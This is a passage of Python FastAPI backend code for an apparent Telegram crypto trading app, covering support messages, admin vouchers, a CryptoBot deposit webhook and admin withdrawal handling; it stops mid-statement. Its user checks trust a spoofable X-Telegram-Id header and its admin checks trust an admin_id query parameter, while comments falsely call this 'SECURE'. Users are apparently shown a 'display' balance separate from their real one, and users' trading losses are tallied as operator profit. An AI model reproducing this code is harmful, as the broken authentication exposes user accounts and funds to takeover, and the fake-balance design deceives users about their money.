        msg_text = f"💬 Сообщение от пользователя\n👤 ID: {u.telegram_id}\n📝 Текст: {text or '[Файл]'}"
        if file_path:
            url=f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            async with aiohttp.ClientSession() as s:
                data=aiohttp.FormData()
                data.add_field("chat_id", str(ADMIN_ID))
                data.add_field("caption", msg_text)
                data.add_field("photo", open(file_path.strip('/'),"rb"))
                data.add_field("reply_markup", json.dumps({"inline_keyboard": reply_btn}))
                await s.post(url, data=data)
        else:
            await bot_send_message(ADMIN_ID, msg_text, reply_btn)
    except: pass
    return {"ok": True}

@app.get("/api/admin_messages")
async def api_admin_messages(db: AsyncSession=Depends(get_db), request: Request=None):
    """Get admin messages for current user (personal messages + global broadcasts only)"""
    tid=request.headers.get("X-Telegram-Id","999999")
    u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
    
    if not u:
        return {"messages": []}
    
    # Get personal messages for this user (user_id == current_user.id)
    personal_msgs = (await db.execute(
        select(AdminMessage)
        .where(AdminMessage.user_id == u.id, AdminMessage.is_deleted == False)
        .order_by(AdminMessage.created_at.desc())
    )).scalars().all()
    
    # Get ONLY global broadcasts (user_id IS NULL AND is_broadcast=True)
    # This excludes limited broadcasts which are stored as personal messages
    global_broadcast_msgs = (await db.execute(
        select(AdminMessage)
        .where(AdminMessage.user_id == None, AdminMessage.is_broadcast == True, AdminMessage.is_deleted == False)
        .order_by(AdminMessage.created_at.desc())
    )).scalars().all()
    
    # Combine and sort by creation time
    all_messages = list(personal_msgs) + list(global_broadcast_msgs)
    all_messages.sort(key=lambda m: m.created_at, reverse=True)
    
    return {"messages": [{
        "id": m.id,
        "message_text": m.message_text,
        "is_broadcast": m.is_broadcast,
        "created_at": m.created_at.isoformat()
    } for m in all_messages]}

@app.delete("/api/support/{message_id}")
async def delete_support_message(message_id: int, request: Request, db: AsyncSession=Depends(get_db)):
    tid = request.headers.get("X-Telegram-Id", "999999")
    current_user = (await db.execute(select(User).where(User.telegram_id == str(tid)))).scalars().first()
    if not current_user:
        raise HTTPException(404, "User not found")
    
    message = (await db.execute(select(SupportMessage).where(SupportMessage.id == message_id))).scalars().first()
    if not message:
        raise HTTPException(404, "Message not found")
    
    is_admin = str(tid) == str(ADMIN_ID)
    
    if not is_admin and message.user_id != current_user.id:
        raise HTTPException(403, "Forbidden: You can only delete your own messages")
    
    message_owner = (await db.execute(select(User).where(User.id == message.user_id))).scalars().first()
    
    await db.delete(message)
    await db.commit()
    
    try:
        if is_admin and message.user_id != current_user.id:
            await bot_send_message(int(message_owner.telegram_id), f"⚠️ Ваше сообщение в поддержку было удалено администратором")
        elif not is_admin:
            await bot_send_message(int(ADMIN_ID), f"🗑 Пользователь {current_user.telegram_id} удалил своё сообщение в поддержку")
    except:
        pass
    
    return {"ok": True}

class BalanceEdit(BaseModel): delta: float

class CheckCreate(BaseModel):
    amount_usdt: float
    expires_in_hours: int = 24  # По умолчанию чек истекает через 24 часа

class CheckActivate(BaseModel):
    check_code: str

def check_admin(request: Request):
    admin_id=request.query_params.get("admin_id")
    if not admin_id or int(admin_id)!=int(ADMIN_ID): raise HTTPException(403,"Forbidden")
    return True

@app.post("/api/admin/user/{user_id}/balance")
async def api_admin_balance(user_id:int, payload: BalanceEdit, request: Request, db: AsyncSession=Depends(get_db)):
    check_admin(request); u=(await db.execute(select(User).where(User.id==user_id))).scalars().first()
    if not u: raise HTTPException(404,"User not found")
    u.balance_usdt=(u.balance_usdt or 0)+float(payload.delta); db.add(Transaction(user_id=u.id,type="admin_adjust",amount=float(payload.delta),currency="USDT",status="done",details={"by":"admin"})); await db.commit()
    return {"ok":True,"new_balance":u.balance_usdt}

@app.post("/api/admin/check/create")
async def api_admin_check_create(payload: CheckCreate, request: Request, db: AsyncSession=Depends(get_db)):
    """Админ создает чек (списывает USDT с своего баланса)"""
    # SECURE: Get authenticated Telegram ID from header (not query param!)
    auth_tid = request.headers.get('X-Telegram-Id')
    if not auth_tid or str(auth_tid) != str(ADMIN_ID):
        raise HTTPException(403, "Forbidden: Only admin can create checks")
    
    # Получаем админа
    admin_user = (await db.execute(select(User).where(User.telegram_id == str(ADMIN_ID)))).scalars().first()
    if not admin_user:
        raise HTTPException(404, "Admin user not found")
    
    # Проверяем баланс админа
    if (admin_user.balance_usdt or 0) < payload.amount_usdt:
        return JSONResponse({"ok": False, "error": f"Недостаточно средств. Баланс: {admin_user.balance_usdt:.2f} USDT"})
    
    # Генерируем уникальный код чека
    import secrets
    check_code = secrets.token_urlsafe(16)  # 22 символа base64
    
    # Вычисляем дату истечения
    expires_at = datetime.utcnow() + timedelta(hours=payload.expires_in_hours)
    
    # Списываем USDT у админа
    admin_user.balance_usdt = (admin_user.balance_usdt or 0) - payload.amount_usdt
    
    # Создаем чек
    new_check = Check(
        creator_id=admin_user.id,
        amount_usdt=payload.amount_usdt,
        check_code=check_code,
        status="active",
        expires_at=expires_at
    )
    db.add(new_check)
    
    # Записываем транзакцию
    db.add(Transaction(
        user_id=admin_user.id,
        type="check_create",
        amount=-payload.amount_usdt,
        currency="USDT",
        status="done",
        details={"check_code": check_code, "expires_at": expires_at.isoformat()}
    ))
    
    await db.commit()
    
    # Генерируем ссылку для активации
    check_link = f"{HOST_BASE}/?check={check_code}"
    
    return {
        "ok": True,
        "check_code": check_code,
        "check_link": check_link,
        "amount_usdt": payload.amount_usdt,
        "expires_at": expires_at.isoformat(),
        "admin_balance": admin_user.balance_usdt
    }

@app.post("/api/check/activate")
async def api_check_activate(payload: CheckActivate, request: Request, db: AsyncSession=Depends(get_db)):
    """Пользователь активирует чек и получает USDT"""
    
    # SECURE: Get authenticated Telegram ID from header
    auth_tid = request.headers.get('X-Telegram-Id')
    if not auth_tid:
        raise HTTPException(401, "Unauthorized")
    
    # Получаем пользователя
    user = (await db.execute(select(User).where(User.telegram_id == auth_tid))).scalars().first()
    if not user:
        raise HTTPException(404, "User not found")
    
    # Находим чек
    check = (await db.execute(select(Check).where(Check.check_code == payload.check_code))).scalars().first()
    if not check:
        return JSONResponse({"ok": False, "error": "Чек не найден"})
    
    # Проверяем статус
    if check.status != "active":
        return JSONResponse({"ok": False, "error": "Чек уже активирован или истёк"})
    
    # Проверяем срок действия
    if check.expires_at and datetime.utcnow() > check.expires_at:
        check.status = "expired"
        await db.commit()
        return JSONResponse({"ok": False, "error": "Срок действия чека истёк"})
    
    # Проверяем что пользователь не активирует свой собственный чек
    if check.creator_id == user.id:
        return JSONResponse({"ok": False, "error": "Вы не можете активировать свой собственный чек"})
    
    # Активируем чек
    check.status = "activated"
    check.activated_by = user.id
    check.activated_at = datetime.utcnow()
    
    # Начисляем USDT пользователю
    user.balance_usdt = (user.balance_usdt or 0) + check.amount_usdt
    
    # Записываем транзакцию
    db.add(Transaction(
        user_id=user.id,
        type="check_activate",
        amount=check.amount_usdt,
        currency="USDT",
        status="done",
        details={"check_code": payload.check_code, "creator_id": check.creator_id}
    ))
    
    await db.commit()
    
    # Уведомляем админа
    try:
        await bot_send_message(
            int(ADMIN_ID),
            f"✅ <b>Чек активирован!</b>\n\n"
            f"💰 Сумма: {check.amount_usdt} USDT\n"
            f"👤 Активировал: #{user.profile_id} (TG: {user.telegram_id})\n"
            f"🔑 Код чека: <code>{payload.check_code}</code>",
            parse_mode="HTML"
        )
    except:
        pass
    
    return {
        "ok": True,
        "amount_usdt": check.amount_usdt,
        "new_balance": user.balance_usdt
    }

class AssetImport(BaseModel): 
    assets: List[Dict[str, Any]]

class AssetStatusUpdate(BaseModel): 
    asset_id: int
    status: str

@app.post("/admin/assets/import")
async def admin_assets_import(payload: AssetImport, request: Request, db: AsyncSession=Depends(get_db)):
    """Admin endpoint: массовый импорт активов из JSON"""
    check_admin(request)
    
    imported = 0
    for asset_data in payload.assets:
        try:
            asset = Asset(
                symbol=asset_data["symbol"],
                name=asset_data["name"],
                asset_class=asset_data["asset_class"],
                otc=asset_data.get("otc", False),
                display=asset_data.get("display", asset_data["name"]),
                exchange=asset_data.get("exchange", ""),
                status=asset_data.get("status", "active")
            )
            db.add(asset)
            imported += 1
        except Exception as e:
            print(f"[ADMIN] Failed to import asset {asset_data.get('symbol')}: {e}")
            continue
    
    await db.commit()
    return {"ok": True, "imported": imported}

@app.put("/admin/assets/set-status")
async def admin_assets_set_status(payload: AssetStatusUpdate, request: Request, db: AsyncSession=Depends(get_db)):
    """Admin endpoint: изменить статус актива (active/inactive)"""
    check_admin(request)
    
    if payload.status not in ["active", "inactive"]:
        raise HTTPException(400, "Status must be 'active' or 'inactive'")
    
    asset = (await db.execute(select(Asset).where(Asset.id == payload.asset_id))).scalars().first()
    if not asset:
        raise HTTPException(404, "Asset not found")
    
    asset.status = payload.status
    await db.commit()
    
    return {"ok": True, "asset_id": payload.asset_id, "new_status": asset.status}

@app.post("/admin/assets/reload")
async def admin_assets_reload(request: Request, db: AsyncSession=Depends(get_db)):
    """Admin endpoint: перезагрузить активы (удалить все и вставить заново из предустановленного списка)"""
    check_admin(request)
    
    # Подсчитать количество активов перед удалением
    count_result = await db.execute(select(func.count(Asset.id)))
    deleted_count = count_result.scalar()
    
    # Удалить все активы
    await db.execute(text("DELETE FROM assets"))
    
    # Сбросить auto-increment sequence
    await db.execute(text("ALTER SEQUENCE assets_id_seq RESTART WITH 1"))
    
    await db.commit()
    
    return {"ok": True, "deleted": deleted_count, "message": "Assets cleared. Use import endpoint to add new assets."}

# ========== CRYPTOBOT WEBHOOK ==========
@app.post("/webhook/cryptobot")
async def cryptobot_webhook(request: Request, db: AsyncSession=Depends(get_db)):
    """CryptoBot webhook for automatic deposit processing"""
    try:
        body_bytes = await request.body()
        signature = request.headers.get("crypto-pay-api-signature", "")
        
        # Verify signature
        if CRYPTO_PAY_TOKEN:
            import hmac
            secret = hashlib.sha256(CRYPTO_PAY_TOKEN.encode()).digest()
            expected = hmac.new(secret, body_bytes, hashlib.sha256).hexdigest()
            
            if not hmac.compare_digest(expected, signature):
                print("[CRYPTOBOT] Invalid signature")
                return {"ok": False, "error": "Invalid signature"}
        
        data = await request.json()
        
        # Process only invoice_paid events
        if data.get("update_type") == "invoice_paid":
            payload = data.get("payload", {})
            invoice_id = str(payload.get("invoice_id"))
            amount = float(payload.get("amount", 0))
            asset = payload.get("asset", "USDT")
            status = payload.get("status")
            
            print(f"[CRYPTOBOT] Invoice {invoice_id} paid: {amount} {asset}, status: {status}")
            
            if status == "paid" and asset == "USDT":
                # Find pending transaction
                trx = (await db.execute(select(Transaction).where(Transaction.details["invoice_id"].astext == invoice_id, Transaction.type == "deposit", Transaction.status == "pending"))).scalars().first()
                
                if trx:
                    user = (await db.execute(select(User).where(User.id == trx.user_id))).scalars().first()
                    if user:
                        # Calculate amount after fee (5%)
                        DEPOSIT_FEE_PERCENT = 5.0
                        fee_amount = round(amount * (DEPOSIT_FEE_PERCENT / 100), 6)
                        amount_after_fee = round(amount - fee_amount, 6)
                        
                        # Credit user's REAL balance
                        user.balance_usdt += amount_after_fee
                        
                        # Update transaction
                        trx.status = "done"
                        trx.details = trx.details or {}
                        trx.details["paid_at"] = datetime.utcnow().isoformat()
                        trx.details["cryptobot_verified"] = True
                        
                        await db.commit()
                        
                        # Notify user
                        try:
                            await bot_send_message(int(user.telegram_id), f"✅ <b>Пополнение успешно!</b>\n\n💰 Зачислено: {amount_after_fee:.2f} USDT\n💳 Комиссия: {fee_amount:.2f} USDT\n📊 Новый баланс: {user.balance_usdt:.2f} USDT")
                        except: pass
                        
                        print(f"[CRYPTOBOT] Deposit processed: User #{user.profile_id}, +{amount_after_fee} USDT")
                    else:
                        print(f"[CRYPTOBOT] User not found for transaction {trx.id}")
                else:
                    print(f"[CRYPTOBOT] Transaction not found for invoice {invoice_id}")
        
        return {"ok": True}
    except Exception as e:
        print(f"[CRYPTOBOT] Webhook error: {e}")
        return {"ok": False, "error": str(e)}

# Helper function for balance changes
async def execute_balance_change(db: AsyncSession, profile_id: int, amount: float, action: str, admin_chat_id: str):
    """Execute balance change with proper notifications"""
    try:
        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
        if not user:
            return {"ok": False, "message": f"❌ Пользователь #{profile_id} не найден"}
        
        old_balance = user.balance_usdt or 0.0
        
        if action == "add":
            new_balance = old_balance + amount
            if new_balance < 0:
                return {"ok": False, "message": f"❌ Недостаточно средств!\n\nТекущий баланс: {old_balance:.2f} USDT\nПопытка списать: {abs(amount):.2f} USDT"}
            user.balance_usdt = new_balance
        elif action == "set":
            if amount < 0:
                return {"ok": False, "message": "❌ Баланс не может быть отрицательным"}
            new_balance = amount
            user.balance_usdt = new_balance
            amount = new_balance - old_balance  # For transaction record
        
        # Create transaction record
        if amount > 0:
            transaction = Transaction(
                user_id=user.id,
                type="deposit",
                amount=abs(amount),
                currency="USDT",
                status="done",
                details={"source": "admin_manual", "admin_id": str(ADMIN_ID), "reason": "Manual balance adjustment"}
            )
            db.add(transaction)
        elif amount < 0:
            transaction = Transaction(
                user_id=user.id,
                type="withdrawal",
                amount=abs(amount),
                currency="USDT",
                status="done",
                details={"source": "admin_manual", "admin_id": str(ADMIN_ID), "reason": "Manual balance adjustment"}
            )
            db.add(transaction)
        
        await db.commit()
        
        # Prepare response message
        operation = "Добавлено" if amount > 0 else "Списано" if amount < 0 else "Без изменений"
        message = f"✅ <b>Баланс изменен!</b>\n\n"
        user_info = format_user_info(user)
        message += f"👤 Пользователь: {user_info}\n\n"
        message += f"💰 Старый баланс: {old_balance:.2f} USDT\n"
        if amount != 0:
            message += f"{'📈' if amount > 0 else '📉'} {operation}: {abs(amount):.2f} USDT\n"
        message += f"💎 <b>Новый баланс: {new_balance:.2f} USDT</b>"
        
        # Notify user
        try:
            if amount > 0:
                await bot_send_message(int(user.telegram_id), 
                    f"💰 <b>Ваш баланс пополнен!</b>\n\n✅ Зачислено: {amount:.2f} USDT\n💵 Новый баланс: {new_balance:.2f} USDT\n\n📝 Причина: Ручное пополнение администратором", 
                    parse_mode="HTML")
            elif amount < 0:
                await bot_send_message(int(user.telegram_id), 
                    f"💸 <b>С вашего баланса списаны средства</b>\n\n📉 Списано: {abs(amount):.2f} USDT\n💵 Новый баланс: {new_balance:.2f} USDT\n\n📝 Причина: Корректировка администратором", 
                    parse_mode="HTML")
        except:
            pass
        
        return {"ok": True, "message": message}
    except Exception as e:
        return {"ok": False, "message": f"❌ Ошибка: {str(e)}"}

router=APIRouter()
@router.post("/webhook")
async def telegram_webhook(update: Dict[str,Any], db: AsyncSession=Depends(get_db)):
    try:
        # Handle callback queries (button clicks)
        if "callback_query" in update:
            cq=update["callback_query"]; data=cq.get("data",""); chat_id=cq["message"]["chat"]["id"]
            
            # ========== ADMIN PANEL CALLBACKS ==========
            # Admin: Show users list
            if data == "admin:users" and str(chat_id) == str(ADMIN_ID):
                users = (await db.execute(select(User).order_by(User.created_at.desc()).limit(10))).scalars().all()
                text = "👥 <b>Последние 10 пользователей:</b>\n\n"
                for u in users:
                    real_bal = u.balance_usdt or 0.0
                    display_bal = u.display_balance_usdt if u.display_balance_usdt is not None else real_bal
                    text += f"🆔 #{u.profile_id} | @{u.username or 'N/A'}\n"
                    text += f"💰 Баланс: {display_bal:.2f} USDT\n"
                    text += f"💎 Реальный: {real_bal:.2f} USDT\n"
                    text += f"📅 {u.created_at.strftime('%Y-%m-%d')}\n\n"
                buttons = [[{"text": "🔙 Назад", "callback_data": "admin:menu"}]]
                await bot_send_message(chat_id, text, buttons)
            
            # Admin: Show statistics with detailed earnings breakdown
            elif data == "admin:stats" and str(chat_id) == str(ADMIN_ID):
                # Basic stats
                total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
                active_trades = (await db.execute(select(func.count(Trade.id)).where(Trade.status == "active"))).scalar() or 0
                total_balance = (await db.execute(select(func.sum(User.balance_usdt)))).scalar() or 0.0
                pending_withdrawals = (await db.execute(select(func.count(Withdrawal.id)).where(Withdrawal.status == "pending"))).scalar() or 0
                
                # Earnings calculations
                # Deposit fees (5% from all completed deposits)
                deposit_txs = (await db.execute(select(Transaction).where(Transaction.type == "deposit", Transaction.status == "done"))).scalars().all()
                deposit_fees = sum(tx.amount * 0.05 for tx in deposit_txs)
                total_deposits = sum(tx.amount for tx in deposit_txs)
                
                # Withdrawal fees (10% from approved withdrawals)
                approved_withdrawals = (await db.execute(select(Withdrawal).where(Withdrawal.status == "approved"))).scalars().all()
                withdrawal_fees = sum(w.usdt_required * 0.10 for w in approved_withdrawals if w.usdt_required)
                total_withdrawals = sum(w.usdt_required or 0 for w in approved_withdrawals)
                
                # Exchange fees (2% embedded in rate)
                exchange_txs = (await db.execute(select(Transaction).where(Transaction.type == "exchange", Transaction.status == "done"))).scalars().all()
                exchange_fees = sum(abs(tx.amount) * 0.02 for tx in exchange_txs)
                
                # Trading fees (2% from all trades)
                all_trades_txs = (await db.execute(select(Transaction).where(Transaction.type == "trade"))).scalars().all()
                trading_fees = sum(tx.details.get("fee", 0) for tx in all_trades_txs if tx.details and isinstance(tx.details, dict))
                
                # Trading profit (lost trades = your profit)
                lost_trades = (await db.execute(select(Trade).where(Trade.status == "completed", Trade.result == "loss"))).scalars().all()
                trading_profit = sum(t.amount for t in lost_trades)
                
                won_trades = (await db.execute(select(Trade).where(Trade.status == "completed", Trade.result == "win"))).scalars().all()
                trading_loss = sum(t.amount * 0.7 for t in won_trades)
                
                net_trading_profit = trading_profit - trading_loss
                
                # Total earnings
                total_earnings = deposit_fees + withdrawal_fees + exchange_fees + trading_fees + net_trading_profit
                
                text = f"💰 <b>Панель заработка</b>\n\n"
                text += f"💵 <b>ОБЩИЙ ДОХОД: {total_earnings:.2f} USDT</b>\n\n"
                text += f"📥 <b>Депозиты (5%):</b> {deposit_fees:.2f} USDT\n"
                text += f"   └ Всего депозитов: {total_deposits:.2f} USDT\n\n"
                text += f"📤 <b>Выводы (10%):</b> {withdrawal_fees:.2f} USDT\n"
                text += f"   └ Всего выведено: {total_withdrawals:.2f} USDT\n\n"
                text += f"🔄 <b>Обмены (2%):</b> {exchange_fees:.2f} USDT\n\n"
                text += f"💸 <b>Комиссия за торговлю (2%):</b> {trading_fees:.2f} USDT\n\n"
                text += f"📊 <b>Проигранные сделки:</b> {net_trading_profit:.2f} USDT\n"
                text += f"   ├ Проигранные: +{trading_profit:.2f}\n"
                text += f"   └ Выигранные: -{trading_loss:.2f}\n\n"
                text += f"━━━━━━━━━━━━━━━━\n"
                text += f"👥 Пользователей: {total_users}\n"
                text += f"📈 Активных сделок: {active_trades}\n"
                text += f"💰 Баланс пользователей: {total_balance:.2f} USDT\n"
                text += f"💸 Заявок на вывод: {pending_withdrawals}\n"
                
                buttons = [[{"text": "🔙 Назад", "callback_data": "admin:menu"}]]
                await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
            
            # Admin: Show withdrawals
            elif data == "admin:withdrawals" and str(chat_id) == str(ADMIN_ID):
                withdrawals = (await db.execute(select(Withdrawal).where(Withdrawal.status.in_(["pending", "processing"])).order_by(Withdrawal.created_at.desc()).limit(10))).scalars().all()
                
                if not withdrawals:
                    # Показываем последние завершенные заявки
                    completed = (await db.execute(select(Withdrawal).where(Withdrawal.status == "completed").order_by(Withdrawal.created_at.desc()).limit(5))).scalars().all()
                    text = "💸 <b>Заявки на вывод</b>\n\n✅ Нет активных заявок\n\n"
                    
                    if completed:
                        text += "📜 <b>Последние выполненные:</b>\n"
                        for w in completed:
                            user = (await db.execute(select(User).where(User.id == w.user_id))).scalars().first()
                            user_display = format_user_display(user)
                            text += f"✅ #{w.id} | {w.amount_rub:,.0f} ₽ | {user_display}\n"
                    
                    await bot_send_message(chat_id, text, [[{"text": "🔙 Назад", "callback_data": "admin:menu"}]], parse_mode="HTML")
                else:
                    text = "💸 <b>Активные заявки на вывод</b>\n\n"
                    # Подсчитаем общую сумму
                    total_pending_usdt = sum(w.amount_usdt for w in withdrawals)
                    total_pending_rub = sum(w.amount_rub for w in withdrawals)
                    text += f"💰 Общая сумма: {total_pending_usdt:.2f} USDT ({total_pending_rub:,.0f} ₽)\n"
                    text += f"📊 Заявок: {len(withdrawals)}\n\n"
                    text += "Нажмите на заявку:\n\n"
                    
                    buttons = []
                    for w in withdrawals:
                        user = (await db.execute(select(User).where(User.id == w.user_id))).scalars().first()
                        user_display = format_user_display(user)
                        status_icon = "🔴" if w.status == "pending" else "🟡"
                        text += f"{status_icon} #{w.id} - {w.amount_usdt:.2f} USDT ({w.amount_rub:,.0f} ₽) | {user_display}\n"
                        button_text = f"#{w.id} | {w.amount_usdt:.2f} USDT"
                        buttons.append([{"text": button_text, "callback_data": f"admin:withdraw:{w.id}"}])
                    
                    buttons.append([{"text": "🔙 Назад", "callback_data": "admin:menu"}])
                    await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
            
            # Admin: Show specific withdrawal card
            elif data.startswith("admin:withdraw:") and str(chat_id) == str(ADMIN_ID):
                withdrawal_id = int(data.split(":", 2)[2])
                withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == withdrawal_id))).scalars().first()
                if not withdrawal:
                    await bot_send_message(chat_id, "❌ Заявка не найдена")
                else:
                    user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
                    current_balance = user.balance_usdt if user else 0
                    
                    # Build card text
                    text = f"💳 <b>Заявка на вывод #{withdrawal.id}</b>\n\n"
                    text += f"👤 <b>Пользователь:</b>\n"
                    user_info = format_user_info(user)
                    text += f"  • {user_info}\n"
                    text += f"  • Telegram ID: {withdrawal.telegram_id or user.telegram_id}\n"
                    text += f"  • Баланс: {current_balance:.2f} USDT\n\n"
                    
                    text += f"💰 <b>Детали вывода:</b>\n"
                    text += f"  • Сумма к выводу: {withdrawal.amount_rub:,.0f} ₽\n"
                    text += f"  • USDT к списанию: {withdrawal.usdt_required:.2f}\n"
                    text += f"  • Комиссия: 10%\n\n"
                    
                    if withdrawal.modified_to_crypto:
                        text += f"🔄 <b>Тип:</b> Крипто-вывод\n"
                        text += f"💎 <b>Валюта:</b> {withdrawal.crypto_currency}\n"
                        text += f"📬 <b>Адрес:</b> <code>{withdrawal.crypto_address}</code>\n"
                    else:
                        text += f"💳 <b>Реквизиты карты:</b>\n"
                        text += f"  • Карта: •••• {withdrawal.card_number or '****'}\n"  # Shows only last 4 digits
                        text += f"  • ФИО: {withdrawal.full_name}\n"
                        text += f"\n⚠️ Полный номер карты был отправлен только в первичном уведомлении\n"
                    
                    text += f"\n📊 <b>Статус:</b> "
                    if withdrawal.status == "pending":
                        text += "🔴 В ожидании"
                    elif withdrawal.status == "processing":
                        text += "🟡 В обработке"
                    elif withdrawal.status == "completed":
                        text += "✅ Завершена"
                    else:
                        text += withdrawal.status
                    text += "\n"
                    
                    if withdrawal.status == "pending":
                        text += "\n⚠️ <b>ПРОЦЕСС ВЫВОДА:</b>\n"
                        text += "1️⃣ При одобрении USDT списываются с баланса пользователя\n"
                        text += "2️⃣ USDT автоматически переводятся на ваш Crypto Bot кошелек\n"
                        text += "3️⃣ Вы вручную переводите рубли на карту клиента\n"
                    
                    if withdrawal.admin_notes:
                        text += f"\n📝 <b>Заметки:</b> {withdrawal.admin_notes}\n"
                    
                    # Buttons
                    buttons = []
                    if withdrawal.status in ["pending", "processing"]:
                        buttons.append([{"text": "✅ Одобрить (списать USDT → перевести вам)", "callback_data": f"admin:withdraw:approve:{withdrawal.id}"}])
                        buttons.append([{"text": "✏️ Изменить", "callback_data": f"admin:withdraw:modify:{withdrawal.id}"}])
                        buttons.append([{"text": "❌ Отменить заявку", "callback_data": f"admin:withdraw:cancel:{withdrawal.id}"}])
                    
                    buttons.append([{"text": "🔙 Назад к списку", "callback_data": "admin:withdrawals"}])
                    await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
            
            # Admin: Approve withdrawal
            elif data.startswith("admin:withdraw:approve:") and str(chat_id) == str(ADMIN_ID):
                withdrawal_id = int(data.split(":", 3)[3])
                withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == withdrawal_id))).scalars().first()
                if withdrawal:
                    user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
                    
                    # Check if already processed
                    if withdrawal.status == "completed":
                        await bot_send_message(chat_id, "⚠️ Эта заявка уже обработана!", [[{"text": "🔙 К заявкам", "callback_data": "admin:withdrawals"}]], parse_mode="HTML")
                        return {"ok": True}
                    
                    # Check balance
                    if not user or user.balance_usdt < withdrawal.usdt_required:
                        text = f"❌ <b>Недостаточно средств!</b>\n\n"
                        text += f"Требуется: {withdrawal.usdt_required:.2f} USDT\n"
                        text += f"Баланс пользователя: {user.balance_usdt if user else 0:.2f} USDT"
                        await bot_send_message(chat_id, text, [[{"text": "🔙 К заявке", "callback_data": f"admin:withdraw:{withdrawal_id}"}]], parse_mode="HTML")
                        return {"ok": True}
                    
                    # Deduct from REAL balance
                    old_balance = user.balance_usdt
                    user.balance_usdt -= withdrawal.usdt_required
                    withdrawal.status = "completed"
                    withdrawal.completed_at = datetime.utcnow()
                    withdrawal.admin_processed_by = str(ADMIN_ID)
                    
                    # Update transaction in history
                    trx = (await db.execute(
                        select(Transaction)
                        .where(Transaction.user_id == user.id, Transaction.type == "withdrawal", Transaction.status == "pending")
                        .order_by(Transaction.created_at.desc())
                    )).scalars().first()
                    if trx:
                        trx.status = "done"
                    
                    await db.commit()
                    
                    # TODO: Transfer USDT to admin's Crypto Bot wallet via Crypto Pay API
                    # This would require implementing the transfer API call
                    
                    # Notify admin with success message
                    text = f"✅ <b>Заявка #{withdrawal.id} одобрена!</b>\n\n"
                    user_info = format_user_info(user)
                    text += f"👤 Пользователь: {user_info}\n"
                    text += f"💰 Старый баланс: {old_balance:.2f} USDT\n"
                    text += f"📉 Списано: {withdrawal.usdt_required:.2f} USDT\n"
                    text += f"💎 Новый баланс: {user.balance_usdt:.2f} USDT\n\n"
                    
                    text += f"💸 К выводу: {withdrawal.amount_rub:,.0f} ₽\n"
                    if not withdrawal.modified_to_crypto:
                        text += f"💳 Карта: •••• {withdrawal.card_number or '****'}\n"
                        text += f"📝 ФИО: {withdrawal.full_name}\n\n"
                        text += "⚠️ <b>Теперь переведите рубли на карту клиента!</b>"
                    
                    buttons = [
                        [{"text": "✅ Готово", "callback_data": "admin:withdrawals"}],
                        [{"text": "📋 Другие заявки", "callback_data": "admin:withdrawals"}]
                    ]
                    
                    await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
                    
                    # Notify user
                    try:
                        user_text = f"✅ <b>Ваша заявка на вывод одобрена!</b>\n\n"
                        user_text += f"📤 Заявка #{withdrawal.id}\n"
                        user_text += f"💰 Сумма: {withdrawal.amount_rub:,.0f} ₽\n\n"
                        user_text += "Средства будут переведены на вашу карту в течение 15 минут."
                        await bot_send_message(int(user.telegram_id), user_text, parse_mode="HTML")
                    except:
                        pass
                else:
                    await bot_send_message(chat_id, "❌ Заявка не найдена")
            
            # Admin: Cancel withdrawal
            elif data.startswith("admin:withdraw:cancel:") and str(chat_id) == str(ADMIN_ID):
                withdrawal_id = int(data.split(":", 3)[3])
                withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == withdrawal_id))).scalars().first()
                if withdrawal:
                    # Check if already processed
                    if withdrawal.status in ["completed", "cancelled"]:
                        await bot_send_message(chat_id, "⚠️ Эта заявка уже обработана!", [[{"text": "🔙 К заявкам", "callback_data": "admin:withdrawals"}]], parse_mode="HTML")
                        return {"ok": True}
                    
                    user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
                    
                    # Return funds to user (real balance) - return full USDT amount including fee
                    if user:
                        old_balance = user.balance_usdt
                        user.balance_usdt += withdrawal.usdt_required  # Return full amount including fee
                    
                    withdrawal.status = "cancelled"
                    withdrawal.completed_at = datetime.utcnow()
                    withdrawal.admin_processed_by = str(ADMIN_ID)
                    withdrawal.admin_notes = f"Отменена администратором {datetime.utcnow().strftime('%d.%m.%Y %H:%M')}"
                    
                    # Update transaction
                    trx = (await db.execute(
                        select(Transaction)
                        .where(Transaction.user_id == user.id, Transaction.type == "withdrawal", Transaction.status == "pending")
                        .order_by(Transaction.created_at.desc())
                    )).scalars().first()
                    if trx:
                        trx.status = "cancelled"
                    
                    await db.commit()
                    
                    # Notify admin
                    text = f"❌ <b>Заявка #{withdrawal.id} отменена!</b>\n\n"
                    if user:
                        user_info = format_user_info(user)
                        text += f"👤 Пользователь: {user_info}\n"
                        text += f"💰 Старый баланс: {old_balance:.2f} USDT\n"
                        text += f"📈 Возвращено: {withdrawal.usdt_required:.2f} USDT\n"
                        text += f"💎 Новый баланс: {user.balance_usdt:.2f} USDT\n\n"
                    text += f"Заявка успешно отменена, средства возвращены пользователю включая комиссию."
                    
                    buttons = [[{"text": "✅ Понятно", "callback_data": "admin:withdrawals"}]]
                    await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
                    
                    # Notify user
                    if user:
                        try:
                            user_text = f"⚠️ <b>Ваша заявка на вывод отменена</b>\n\n"
                            user_text += f"📤 Заявка #{withdrawal.id}\n"
                            user_text += f"💰 Возвращено на баланс: {withdrawal.usdt_required:.2f} USDT\n"
                            user_text += f"💎 Ваш баланс: {user.balance_usdt:.2f} USDT\n\n"
                            user_text += "Полная сумма включая комиссию возвращена на ваш баланс.\n"
                            user_text += "Если у вас есть вопросы, обратитесь в поддержку."
                            await bot_send_message(int(user.telegram_id), user_text, parse_mode="HTML")
                        except:
                            pass
                else:
                    await bot_send_message(chat_id, "❌ Заявка не найдена")
            
            # Admin: Modify withdrawal
            elif data.startswith("admin:withdraw:modify:") and str(chat_id) == str(ADMIN_ID):
                withdrawal_id = int(data.split(":", 3)[3])
                text = "✏️ <b>Изменение заявки</b>\n\nВыберите действие:"
                buttons = [
